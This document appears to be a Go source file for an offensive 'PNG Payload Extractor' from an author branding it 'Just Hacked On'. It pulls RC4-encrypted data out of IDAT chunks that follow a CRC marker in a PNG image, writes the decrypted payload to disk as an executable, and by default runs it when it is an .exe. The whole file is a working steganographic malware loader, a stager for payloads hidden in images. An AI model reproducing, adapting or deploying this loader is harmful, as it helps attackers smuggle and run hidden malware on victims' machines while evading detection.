package main

import (
	"crypto/rc4"
	"encoding/binary"
	"flag"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"time"

	"github.com/fatih/color"
	"github.com/schollz/progressbar/v3"
)

// Constants
const (
	IDAT         = "\x49\x44\x41\x54"                                 // 'IDAT'
	IEND         = "\x00\x00\x00\x00\x49\x45\x4E\x44\xAE\x42\x60\x82" // PNG file footer
	MAX_IDAT_LNG = 8192                                               // Maximum size of each IDAT chunk
	RC4_KEY_LNG  = 16                                                 // RC4 key size
	PNG_HEADER   = "\x89PNG\r\n\x1a\n"                                // PNG file header
)

// ASCII Art for "Just Hacked On"
const asciiArt = `
     ██╗██╗   ██╗███████╗████████╗    ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗      ██████╗ ███╗   ██╗
     ██║██║   ██║██╔════╝╚══██╔══╝    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗    ██╔═══██╗████╗  ██║
     ██║██║   ██║███████╗   ██║       ███████║███████║██║     █████╔╝ █████╗  ██║  ██║    ██║   ██║██╔██╗ ██║
██   ██║██║   ██║╚════██║   ██║       ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║  ██║    ██║   ██║██║╚██╗██║
╚█████╔╝╚██████╔╝███████║   ██║       ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██████╔╝    ╚██████╔╝██║ ╚████║
 ╚════╝  ╚═════╝ ╚══════╝   ╚═╝       ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝      ╚═════╝ ╚═╝  ╚═══╝
                                                                   Abdul Ahad   ==> Security Just an illusion
`

// Global log file
var logFile *os.File

// Initialize log file with timestamp
func initLogFile(logFileName string) error {
	var err error
	logFile, err = os.OpenFile(logFileName, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return fmt.Errorf("[!] Failed to open log file: %v", err)
	}
	return nil
}

// Write to both terminal and log file
func logToFileAndPrint(data string) {
	fmt.Fprintln(logFile, data) // Write to file
	fmt.Println(data)           // Write to terminal
}

// Print colored output and log to file
func printRed(data string) {
	coloredData := color.RedString(data)
	logToFileAndPrint(coloredData)
}

func printYellow(data string) {
	coloredData := color.YellowString(data)
	logToFileAndPrint(coloredData)
}

func printWhite(data string) {
	coloredData := color.WhiteString(data)
	logToFileAndPrint(coloredData)
}

// Print ASCII art and name
func printHeader() {
	logToFileAndPrint(asciiArt)
	boldName := color.New(color.Bold).Sprint("Abdul Ahad")
	logToFileAndPrint(boldName)
	logToFileAndPrint("") // Add a blank line
}

// Find payload chunks in PNG
func findPayloadChunks(pngPath string, markedCRC uint32) ([][]byte, error) {
	data, err := os.ReadFile(pngPath)
	if err != nil {
		return nil, fmt.Errorf("[!] Error reading PNG file: %v", err)
	}

	// Validate PNG header
	if len(data) < 8 || string(data[:8]) != PNG_HEADER {
		return nil, fmt.Errorf("[!] '%s' is not a valid PNG file", pngPath)
	}

	chunks := [][]byte{}
	i := 8 // Skip PNG header
	foundMarker := false
	bar := progressbar.Default(int64(len(data))) // Progress bar for chunk processing
	for i < len(data) {
		if i+8 <= len(data) && string(data[i+4:i+8]) == IDAT {
			length := int(binary.BigEndian.Uint32(data[i : i+4]))
			if i+8+length+4 > len(data) {
				return nil, fmt.Errorf("[!] Invalid IDAT chunk at offset %d", i)
			}
			chunkData := data[i+8 : i+8+length]
			crc := binary.BigEndian.Uint32(data[i+8+length : i+12+length])
			if !foundMarker && crc == markedCRC {
				foundMarker = true
				printWhite(fmt.Sprintf("[>] Found marker IDAT with CRC 0x%x", crc))
			} else if foundMarker {
				chunks = append(chunks, chunkData)
				printWhite(fmt.Sprintf("[>] Found payload chunk of length %d", len(chunkData)))
			}
			i += 8 + length + 4
		} else {
			i++
		}
		bar.Add(1) // Update progress
	}

	if !foundMarker {
		return nil, fmt.Errorf("[!] Marker CRC 0x%x not found", markedCRC)
	}
	if len(chunks) == 0 {
		return nil, fmt.Errorf("[!] No payload chunks found")
	}
	return chunks, nil
}

// Decrypt payload from chunks
func decryptPayload(chunks [][]byte) ([]byte, error) {
	payload := []byte{}
	for i, chunk := range chunks {
		if len(chunk) < RC4_KEY_LNG {
			return nil, fmt.Errorf("[!] Chunk %d too short for RC4 key", i)
		}
		rc4Key := chunk[:RC4_KEY_LNG]
		encrypted := chunk[RC4_KEY_LNG:]
		cipher, err := rc4.NewCipher(rc4Key)
		if err != nil {
			return nil, fmt.Errorf("[!] RC4 cipher error: %v", err)
		}
		decrypted := make([]byte, len(encrypted))
		cipher.XORKeyStream(decrypted, encrypted)
		payload = append(payload, decrypted...)
		printWhite(fmt.Sprintf("[i] Decrypted chunk %d with RC4 key: %x", i, rc4Key))
	}
	return payload, nil
}

func main() {
	// Custom help menu
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "PNG Payload Extractor by Abdul Ahad\n")
		fmt.Fprintf(os.Stderr, "Extracts and decrypts a payload from a PNG file using RC4.\n")
		fmt.Fprintf(os.Stderr, "Usage: %s [options]\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Options:\n")
		flag.PrintDefaults()
	}

	pngFile := flag.String("png", "", "Input PNG file containing the payload")
	outputFile := flag.String("o", "", "Output file for extracted payload")
	markedCRC := flag.Uint("crc", 0, "Marker CRC value in hex (e.g., 0x12345678)")
	logFileName := flag.String("log", fmt.Sprintf("fetch_log_%s.txt", time.Now().Format("20060102_150405")), "Output log file name")
	execute := flag.Bool("exec", true, "Execute the extracted file (Windows only)")
	flag.Parse()

	if *pngFile == "" || *outputFile == "" || *markedCRC == 0 {
		printRed("Usage: fetch -png <input.png> -o <output.exe> -crc <marked_crc_hex> [-log <logfile>] [-exec <true/false>]")
		flag.Usage()
		os.Exit(1)
	}

	// Validate input file
	if _, err := os.Stat(*pngFile); os.IsNotExist(err) {
		printRed(fmt.Sprintf("[!] '%s' does not exist", *pngFile))
		os.Exit(1)
	}

	// Check if output file exists
	if _, err := os.Stat(*outputFile); !os.IsNotExist(err) {
		printYellow("[!] Output file already exists. Overwrite? (y/n)")
		var response string
		fmt.Scanln(&response)
		if response != "y" && response != "Y" {
			printRed("[!] Aborted by user")
			os.Exit(1)
		}
	}

	// Initialize log file
	err := initLogFile(*logFileName)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	defer logFile.Close()

	// Print ASCII art and name
	printHeader()

	// Find payload chunks
	chunks, err := findPayloadChunks(*pngFile, uint32(*markedCRC))
	if err != nil {
		printRed(err.Error())
		os.Exit(1)
	}

	// Decrypt payload
	payload, err := decryptPayload(chunks)
	if err != nil {
		printRed(err.Error())
		os.Exit(1)
	}

	// Save payload to output file with executable permissions
	absOutputFile, err := filepath.Abs(*outputFile)
	if err != nil {
		printRed(fmt.Sprintf("[!] Error getting absolute path for output file: %v", err))
		os.Exit(1)
	}
	err = os.WriteFile(absOutputFile, payload, 0755) // Executable permissions
	if err != nil {
		printRed(fmt.Sprintf("[!] Error writing output file: %v", err))
		os.Exit(1)
	}
	printYellow(fmt.Sprintf("[*] Extracted payload to %s", absOutputFile))

	// Execute the extracted file (Windows only)
	if *execute && filepath.Ext(absOutputFile) == ".exe" {
		cmd := exec.Command(absOutputFile)
		err = cmd.Start()
		if err != nil {
			printRed(fmt.Sprintf("[!] Error executing %s: %v", absOutputFile, err))
			os.Exit(1)
		}
		printWhite(fmt.Sprintf("[i] Executed %s", absOutputFile))
	} else if *execute && filepath.Ext(absOutputFile) != ".exe" {
		printYellow("[!] Skipping execution: Output file is not an .exe")
	}
}
